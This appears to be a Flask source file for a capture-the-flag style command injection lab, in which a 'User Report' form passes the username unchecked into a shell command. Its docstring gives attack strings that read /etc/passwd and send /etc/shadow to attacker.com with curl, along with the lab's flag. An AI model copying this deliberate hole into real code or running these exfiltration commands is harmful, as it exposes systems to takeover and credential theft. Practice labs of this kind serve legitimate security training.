"""
Command Injection Lab 15: Data Exfiltration
Difficulty: 3 (Advanced)
Type: Command Injection
Points: 100

Description:
Stealing sensitive data through command injection.
"""

from flask import Flask, request, render_template_string
import subprocess

app = Flask(__name__)

TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>User Report</title>
    <style>
        body { font-family: Arial; margin: 20px; }
        input { padding: 8px; width: 300px; }
        button { padding: 8px 15px; }
        #output { margin-top: 20px; background: #f0f0f0; padding: 10px; white-space: pre; max-height: 400px; overflow: auto; }
    </style>
</head>
<body>
    <h1>User Report</h1>
    <form method="GET">
        <input type="text" name="user" placeholder="Enter username" value="{{ user }}">
        <button type="submit">Generate</button>
    </form>
    {% if output %}
    <h3>Report:</h3>
    <div id="output">{{ output }}</div>
    {% endif %}
</body>
</html>
"""

@app.route('/', methods=['GET'])
def index():
    """
    Vulnerable data exfiltration
    
    Attack Vector:
    /?user=admin; cat /etc/passwd > /tmp/stolen
    /?user=admin; curl http://attacker.com/?data=$(cat /etc/shadow)
    
    Flag: FLAG{cmd_injection_data_exfil_015}
    """
    user = request.args.get('user', '')
    output = ''
    
    if user:
        try:
            # VULNERABLE: Allows file access
            cmd = f"id {user}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            output = result.stdout + result.stderr
        except Exception as e:
            output = f"Error: {str(e)}"
    
    return render_template_string(TEMPLATE, user=user, output=output)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5015, debug=False)
